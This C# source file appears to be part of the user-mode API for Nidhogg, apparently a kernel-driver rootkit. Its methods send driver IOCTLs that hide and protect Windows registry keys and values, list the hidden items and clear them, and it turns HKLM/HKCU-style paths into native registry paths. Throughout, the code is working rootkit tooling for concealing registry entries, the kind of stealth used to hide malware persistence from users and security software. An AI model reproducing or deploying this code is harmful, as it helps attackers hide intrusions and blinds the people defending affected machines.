using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace NidhoggCSharpApi
{
    internal partial class NidhoggApi
    {
        private string ParseRegistryKey(string key)
        {
            string parsedKey = key;

            if (key.StartsWith("HKEY_LOCAL_MACHINE"))
                parsedKey = key.Replace("HKEY_LOCAL_MACHINE", @"\Registry\Machine");
            else if (key.StartsWith("HKLM"))
                parsedKey = key.Replace("HKLM", @"\Registry\Machine");
            else if (key.StartsWith("HKEY_CLASSES_ROOT"))
                parsedKey = key.Replace("HKEY_CLASSES_ROOT", @"\Registry\Machine\Software\Classes");
            else if (key.StartsWith("HKCR"))
                parsedKey = key.Replace("HKCR", @"\Registry\Machine\Software\Classes");
            else if (key.StartsWith("HKEY_CURRENT_USER") || key.StartsWith("HKCU"))
            {
                string sid = WindowsIdentity.GetCurrent().User.Value;
                parsedKey = key.Replace("HKEY_CURRENT_USER", $"\\Registry\\User\\{sid}")
                    .Replace("HKCU", $"\\Registry\\User\\{sid}");
            }
            else if (key.StartsWith("HKEY_USERS"))
                parsedKey = key.Replace("HKEY_USERS", @"\Registry\User");
            else if (key.StartsWith("HKU"))
                parsedKey = key.Replace("HKU", @"\Registry\User");
            else if (key.StartsWith("HKEY_CURRENT_CONFIG"))
                parsedKey = key.Replace("HKEY_CURRENT_CONFIG", @"\Registry\Machine\System\CurrentControlSet\Hardware Profiles\Current");
            else if (key.StartsWith("HKCC"))
                parsedKey = key.Replace("HKCC", @"\Registry\Machine\System\CurrentControlSet\Hardware Profiles\Current");
            return parsedKey;
        }
        private NidhoggErrorCodes RegistryProtection(string key, RegItemType regItemType, bool protect,
            string value = "")
        {
            RegItem regItem = new RegItem
            {
                KeyPath = ParseRegistryKey(key),
                Type = regItemType
            };

            if (value != "" && (regItemType == RegItemType.RegHiddenValue ||
                regItemType == RegItemType.RegProtectedValue))
                regItem.ValueName = value;

            return protect ? NidhoggSendDataIoctl(regItem, IOCTL_PROTECT_REGITEM) :
                NidhoggSendDataIoctl(regItem, IOCTL_UNPROTECT_REGITEM);
        }

        private string[] QueryRegistryKeys(RegItemType regItemType)
        {
            RegItem result;
            string[] keys;
            int amountOfKeys;

            if (regItemType != RegItemType.RegProtectedKey && regItemType != RegItemType.RegHiddenKey)
                return null;

            result = new RegItem
            {
                RegItemsIndex = 0,
                Type = regItemType,
            };

            result = NidhoggSendRecieveDataIoctl(result, IOCTL_QUERY_REGITEMS);
            amountOfKeys = result.RegItemsIndex;

            if (amountOfKeys == 0)
                return null;

            keys = new string[amountOfKeys];
            keys[0] = result.KeyPath;

            for (int i = 1; i < amountOfKeys; i++)
            {
                result.RegItemsIndex = i;

                result = NidhoggRecieveDataIoctl(result, IOCTL_QUERY_REGITEMS);
                keys[i] = result.KeyPath;
            }

            return keys;
        }

        private Dictionary<string, string> QueryRegistryValues(RegItemType regItemType)
        {
            RegItem result;
            Dictionary<string, string> values;
            int amountOfValues;

            if (regItemType != RegItemType.RegProtectedValue && regItemType != RegItemType.RegHiddenValue)
                return null;

            result = new RegItem
            {
                RegItemsIndex = 0,
                Type = regItemType,
            };

            result = NidhoggSendRecieveDataIoctl(result, IOCTL_QUERY_REGITEMS);
            amountOfValues = result.RegItemsIndex;

            if (amountOfValues == 0)
                return null;

            values = new Dictionary<string, string>(amountOfValues)
            {
                { result.KeyPath, result.ValueName }
            };

            for (int i = 1; i < amountOfValues; i++)
            {
                result.RegItemsIndex = i;

                result = NidhoggRecieveDataIoctl(result, IOCTL_QUERY_REGITEMS);
                values.Add(result.KeyPath, result.ValueName);
            }

            return values;
        }

        public NidhoggErrorCodes RegistryProtectKey(string key)
        {
            return RegistryProtection(key, RegItemType.RegProtectedKey, true);
        }

        public NidhoggErrorCodes RegistryHideKey(string key)
        {
            return RegistryProtection(key, RegItemType.RegHiddenKey, true);
        }

        public NidhoggErrorCodes RegistryProtectValue(string key, string value)
        {
            return RegistryProtection(key, RegItemType.RegProtectedValue, true, value);
        }

        public NidhoggErrorCodes RegistryHideValue(string key, string value)
        {
            return RegistryProtection(key, RegItemType.RegHiddenValue, true, value);
        }

        public NidhoggErrorCodes RegistryUnprotectKey(string key)
        {
            return RegistryProtection(key, RegItemType.RegProtectedKey, false);
        }

        public NidhoggErrorCodes RegistryUnhideKey(string key)
        {
            return RegistryProtection(key, RegItemType.RegHiddenKey, false);
        }

        public NidhoggErrorCodes RegistryUnprotectValue(string key, string value)
        {
            return RegistryProtection(key, RegItemType.RegProtectedValue, false, value);
        }

        public NidhoggErrorCodes RegistryUnhideValue(string key, string value)
        {
            return RegistryProtection(key, RegItemType.RegHiddenValue, false, value);
        }

        public NidhoggErrorCodes RegistryClearAllProtection()
        {
            if (!DeviceIoControl(hNidhogg, IOCTL_CLEAR_REGITEMS,
                IntPtr.Zero, 0, IntPtr.Zero, 0, out uint _, IntPtr.Zero))
                return NidhoggErrorCodes.NIDHOGG_ERROR_DEVICECONTROL_DRIVER;

            return NidhoggErrorCodes.NIDHOGG_SUCCESS;
        }
        public string[] QueryProtectedRegistryKeys()
        {
            return QueryRegistryKeys(RegItemType.RegProtectedKey);
        }

        public string[] QueryHiddenRegistryKeys()
        {
            return QueryRegistryKeys(RegItemType.RegHiddenKey);
        }

        public Dictionary<string, string> QueryProtectedRegistryValues()
        {
            return QueryRegistryValues(RegItemType.RegProtectedValue);
        }

        public Dictionary<string, string> QueryHiddenRegistryValues()
        {
            return QueryRegistryValues(RegItemType.RegHiddenValue);
        }
    }
}